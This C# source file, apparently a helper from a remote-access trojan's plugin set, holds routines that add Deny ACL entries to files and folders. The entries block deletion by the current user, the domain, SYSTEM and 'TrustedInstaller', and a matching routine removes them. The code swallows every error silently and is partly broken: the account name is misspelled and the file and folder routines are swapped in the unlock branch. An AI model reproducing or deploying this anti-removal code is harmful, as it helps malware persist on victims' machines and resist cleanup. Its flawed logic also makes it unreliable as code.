using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

namespace Plugin.Helper;

internal class SecrityHidden
{
	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void Unlock(string path)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			if (fileInfo.Attributes == FileAttributes.Directory)
			{
				try
				{
					RemoveFileSecurity(fileInfo.Directory.FullName, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
					RemoveFileSecurity(fileInfo.Directory.FullName, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
					if (IsAdmin())
					{
						RemoveFileSecurity(fileInfo.Directory.FullName, "System", FileSystemRights.Delete, AccessControlType.Deny);
						RemoveFileSecurity(fileInfo.Directory.FullName, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
					}
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					RemoveFolderSecurity(fileInfo.FullName, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
					RemoveFolderSecurity(fileInfo.FullName, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
					if (IsAdmin())
					{
						RemoveFolderSecurity(fileInfo.FullName, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
						RemoveFolderSecurity(fileInfo.FullName, "System", FileSystemRights.Delete, AccessControlType.Deny);
						RemoveFolderSecurity(fileInfo.FullName, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
					}
				}
				catch
				{
				}
			}
			fileInfo.Directory.Attributes = FileAttributes.Normal;
			fileInfo.Attributes = FileAttributes.Normal;
		}
		catch
		{
		}
	}

	public static void LockFolder(string path)
	{
		try
		{
			AddFolderSecurity(path, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
			AddFolderSecurity(path, Environment.UserName, FileSystemRights.Read, AccessControlType.Deny);
			AddFolderSecurity(path, Environment.UserName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFolderSecurity(path, Environment.UserName, FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
			AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
			AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.Read, AccessControlType.Deny);
			AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFolderSecurity(path, "TrustedInsraller", FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
			AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
			AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.Read, AccessControlType.Deny);
			AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFolderSecurity(path, Environment.UserDomainName, FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
			AddFolderSecurity(path, "System", FileSystemRights.Delete, AccessControlType.Deny);
			AddFolderSecurity(path, "System", FileSystemRights.Read, AccessControlType.Deny);
			AddFolderSecurity(path, "System", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFolderSecurity(path, "System", FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny);
		}
		catch
		{
		}
	}

	public static void LockFile(string path)
	{
		try
		{
			AddFileSecurity(path, Environment.UserName, FileSystemRights.Delete, AccessControlType.Deny);
			AddFileSecurity(path, "TrustedInsraller", FileSystemRights.Delete, AccessControlType.Deny);
			AddFileSecurity(path, Environment.UserDomainName, FileSystemRights.Delete, AccessControlType.Deny);
			AddFileSecurity(path, "System", FileSystemRights.Delete, AccessControlType.Deny);
			AddFileSecurity(path, Environment.UserName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFileSecurity(path, "TrustedInsraller", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFileSecurity(path, Environment.UserDomainName, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
			AddFileSecurity(path, "System", FileSystemRights.ReadAndExecute, AccessControlType.Allow);
		}
		catch
		{
		}
	}

	public static void RemoveFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
	{
		try
		{
			FileSecurity accessControl = File.GetAccessControl(fileName);
			accessControl.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
			File.SetAccessControl(fileName, accessControl);
		}
		catch
		{
			Thread.Sleep(10);
		}
	}

	public static void RemoveFolderSecurity(string path, string account, FileSystemRights rights, AccessControlType controlType)
	{
		try
		{
			DirectorySecurity accessControl = Directory.GetAccessControl(path);
			accessControl.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
			Directory.SetAccessControl(path, accessControl);
		}
		catch
		{
			Thread.Sleep(10);
		}
	}

	public static void AddFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
	{
		try
		{
			FileSecurity accessControl = File.GetAccessControl(fileName);
			accessControl.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
			File.SetAccessControl(fileName, accessControl);
		}
		catch
		{
			Thread.Sleep(10);
		}
	}

	public static void AddFolderSecurity(string path, string account, FileSystemRights rights, AccessControlType controlType)
	{
		try
		{
			DirectorySecurity accessControl = Directory.GetAccessControl(path);
			accessControl.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
			Directory.SetAccessControl(path, accessControl);
		}
		catch
		{
			Thread.Sleep(10);
		}
	}
}
